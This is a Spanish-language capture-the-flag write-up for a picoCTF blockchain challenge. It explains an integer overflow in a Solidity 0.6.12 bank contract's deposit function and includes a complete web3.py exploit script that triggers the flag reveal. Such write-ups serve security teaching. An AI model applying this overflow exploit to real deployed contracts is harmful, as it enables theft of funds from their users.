# Blockchain — Smart_Overflow

## Descripción
> **Prompt oficial del reto:** "The contract tracks balances using `uint256` math. It should be impossible to get the flag..."
>
> **Pistas oficiales:**
> 1. What happens when balances[msg.sender] becomes smaller after a deposit?
> 2. Look at the flag reveal condition carefully.
> 3. Why do attackers like integers?

- **Categoría:** Blockchain
- **Dificultad:** Medium
- **Evento/origen:** picoCTF 2026
- **Autor:** LT 'syreal' Jones

## Solución
El reto despliega un contrato inteligente escrito en Solidity `^0.6.12` denominado `IntOverflowBank.sol`. En versiones de Solidity previas a la 0.8.0, las operaciones aritméticas enteras no cuentan con protección automática contra desbordamientos (*overflow* o *underflow*), comportándose con aritmética modular de $2^{256}$.

### 1. Análisis del contrato inteligente
Al inspeccionar la función `deposit` en `IntOverflowBank.sol`:

```solidity
function deposit(uint256 amount) external {
    uint256 oldBalance = balances[msg.sender];
    balances[msg.sender] = balances[msg.sender] + amount;

    emit Deposit(msg.sender, amount);
    if (!revealed && balances[msg.sender] < amount) {
        revealed = true;
        emit FlagRevealed(flag);
    }
}
```

La condición para revelar la bandera exige que `balances[msg.sender] < amount`.
- Si el balance inicial es 0 y depositamos cualquier cantidad `X`, el nuevo balance será `X`, de modo que `balances[msg.sender] < amount` es falso ($X < X$ es falso).
- Sin embargo, si primero depositamos `1`, nuestro balance pasa a ser `1`.
- En un segundo depósito, suministramos la cantidad máxima representable en 256 bits:
  $$\text{amount} = 2^{256} - 1$$
- Al calcular `balances[msg.sender] + amount`:
  $$1 + (2^{256} - 1) = 2^{256} \equiv 0 \pmod{2^{256}}$$
- El nuevo balance resultante se reinicia a `0`.
- Como $0 < 2^{256} - 1$, la condición `balances[msg.sender] < amount` se evalúa como verdadera, activando `revealed = true` y emitiendo el evento `FlagRevealed`.

### 2. Script de explotación con Web3.py
Utilizando `web3.py` para interactuar con el nodo RPC privado de la instancia:

```python
from web3 import Web3

rpc = "http://<host>:<port_rpc>"
w3 = Web3(Web3.HTTPProvider(rpc))

contract_addr = "0x..."
player_addr = "0x..."
player_priv = "0x..."

abi = [
    {
        "inputs": [{"internalType": "uint256", "name": "amount", "type": "uint256"}],
        "name": "deposit",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function",
    },
    {
        "inputs": [],
        "name": "getFlag",
        "outputs": [{"internalType": "string", "name": "", "type": "string"}],
        "stateMutability": "view",
        "type": "function",
    },
    {
        "inputs": [],
        "name": "revealed",
        "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
        "stateMutability": "view",
        "type": "function",
    },
]

contract = w3.eth.contract(address=contract_addr, abi=abi)


def send_deposit(amount):
    nonce = w3.eth.get_transaction_count(player_addr)
    tx = contract.functions.deposit(amount).build_transaction({
        "from": player_addr,
        "nonce": nonce,
        "gas": 300000,
        "gasPrice": w3.to_wei("1", "gwei"),
    })
    signed = w3.eth.account.sign_transaction(tx, private_key=player_priv)
    tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
    return w3.eth.wait_for_transaction_receipt(tx_hash)


# Paso 1: Establecer balance inicial en 1
send_deposit(1)

# Paso 2: Provocar overflow aritmético sumando (2**256 - 1)
send_deposit((2**256) - 1)

# Paso 3: Consultar la bandera revelada
if contract.functions.revealed().call():
    flag = contract.functions.getFlag().call()
    print("Flag:", flag)
```

Al ejecutarse ambas transacciones, el contrato valida la condición de desbordamiento y `getFlag()` retorna la bandera en formato `academy{...}`.

## Notas adicionales
- A partir de Solidity 0.8.0, todas las operaciones aritméticas enteras incluyen comprobaciones de desbordamiento automáticas que revierten la transacción (`revert()`) a menos que se utilicen bloques explícitos `unchecked { ... }`.

## Referencias
- Reto: https://learn.cylabacademy.org/library/760
- Solidity 0.8.0 Breaking Changes: https://docs.soliditylang.org/en/v0.8.0/080-breaking-changes.html
- SWC-101 (Integer Overflow and Underflow): https://swcregistry.io/docs/SWC-101
